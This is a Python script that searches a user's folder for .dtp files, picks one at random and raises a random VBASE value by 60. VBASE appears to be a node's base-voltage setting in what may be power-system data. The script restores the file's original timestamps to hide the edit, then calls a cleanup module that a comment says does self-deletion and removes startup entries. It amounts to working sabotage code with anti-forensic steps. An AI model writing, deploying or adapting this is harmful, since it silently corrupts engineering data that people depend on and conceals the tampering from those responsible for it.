import os                     # Provides functions for interacting with the operating system (e.g., file paths)
import re                     # Provides regular expression operations
import random                 # Used for random selection (e.g., picking a random file or match)
import shutil                 # High-level file operations, such as copying and moving files
import tempfile               # Used to create temporary files
import startup_delete         # Custom module to handle deletion of startup entries and cleanup

SEARCH_ROOT = r"C:\Users\danie\OneDrive\Desktop\SDP2"            # Define the root directory where the script will search for .dtp files

# Replaces a file's content with new content while preserving its metadata (e.g., timestamps and permissions)
def _preserve_and_replace(file_path: str, new_content: str):
    print(f"[DEBUG] Preserving metadata and replacing file: {file_path}")
    stat = os.stat(file_path)                                    # Get current file stats (timestamps, size, etc.)
    atime, mtime = stat.st_atime, stat.st_mtime                  # Store access and modification times

    dir_name = os.path.dirname(file_path)                        # Get the directory containing the file
    fd, temp_path = tempfile.mkstemp(dir=dir_name)               # Create a temp file in the same directory
    print(f"[DEBUG] Writing to temp file: {temp_path}")
    with os.fdopen(fd, 'w') as tf:                               # Open the temp file with write access
        tf.write(new_content)                                    # Write new content to temp file

    shutil.copystat(file_path, temp_path)                        # Copy metadata (e.g., permissions) from original to temp
    print(f"[DEBUG] Copied permissions to temp file")

    os.replace(temp_path, file_path)                             # Replace original file with the temp file
    os.utime(file_path, (atime, mtime))                          # Restore original timestamps
    print(f"[DEBUG] Replaced original file and restored timestamps")


# Finds and modifies a random VBASE value in the file by adding 60 to it
def _modify_random_vbase(file_path: str) -> bool:
    print(f"[DEBUG] Modifying VBASE in file: {file_path}")
    with open(file_path, 'r') as f:
        content = f.read()                                       # Read the entire content of the file

    pattern = re.compile(r'(VBASE\s*=\s*)([-+]?\d+(?:\.\d+)?)', re.IGNORECASE)  # Regex to find 'VBASE = number'
    matches = list(pattern.finditer(content))                    # Find all matches of the pattern
    print(f"[DEBUG] Found {len(matches)} VBASE entries")
    if not matches:
        print(f"[DEBUG] No VBASE entries found in {file_path}")
        return False                                             # Exit if no VBASE entries found

    match = random.choice(matches)                               # Choose a random VBASE match to modify
    orig_val = float(match.group(2))                             # Extract the original VBASE value as float
    new_val = orig_val + 60                                      # Modify the value by adding 60

    if new_val.is_integer():                                     # Convert to string, using integer format if applicable
        new_str = str(int(new_val))
    else:
        new_str = str(new_val)

    # Get the line where this VBASE was found to extract NODE info
    start_idx = match.start()
    end_idx = match.end()
    line_start = content.rfind('\n', 0, start_idx)               # Find start of the line
    line_end = content.find('\n', end_idx)                       # Find end of the line
    if line_start == -1:
        line_start = 0
    if line_end == -1:
        line_end = len(content)
    line = content[line_start:line_end]                          # Extract the full line
    node_match = re.search(r'NODE\s*=\s*(\d+)', line)            # Look for NODE info on the same line
    node_id = node_match.group(1) if node_match else 'Unknown'

    print(f"[INFO] Selected NODE: {node_id}, VBASE {int(orig_val) if orig_val.is_integer() else orig_val} -> {new_str}")

    start, end = match.span(2)                                   # Get positions of the number in the match
    updated = content[:start] + new_str + content[end:]          # Replace old value with new one in content

    _preserve_and_replace(file_path, updated)                    # Save the updated content, preserving file metadata
    print(f"[INFO] Updated NODE: {node_id}, VBASE {int(orig_val) if orig_val.is_integer() else orig_val} -> {new_str} in {file_path}")
    return True                                                  # Indicate successful modification


# Main function that scans for .dtp files, randomly modifies one, and then runs cleanup
def my_custom_function():
    print(f"[INFO] my_custom_function invoked, searching under {SEARCH_ROOT}")
    for root, _, files in os.walk(SEARCH_ROOT):                  # Recursively walk through SEARCH_ROOT
        dtps = [os.path.join(root, f) for f in files if f.lower().endswith('.dtp')]  # Find .dtp files
        if not dtps:
            continue                                             # Skip if no .dtp files found in this directory

        print(f"[DEBUG] Found {len(dtps)} .dtp files in {root}")
        target = random.choice(dtps)                             # Pick a random .dtp file to modify
        print(f"[INFO] Selected file for modification: {target}")
        try:
            if _modify_random_vbase(target):                     # Try modifying a VBASE in the file
                print(f"[INFO] Successfully modified {target}")
                startup_delete.clean_up()                        # Run cleanup function (self-delete, etc.)
            else:
                print(f"[WARNING] No modification made to {target}")
        except Exception as e:
            print(f"[ERROR] Exception modifying {target}: {e}")
        break                                                    # Only modify one file per run
    else:
        print(f"[WARNING] No .dtp files found under {SEARCH_ROOT}")  # Ran through all dirs and found nothing
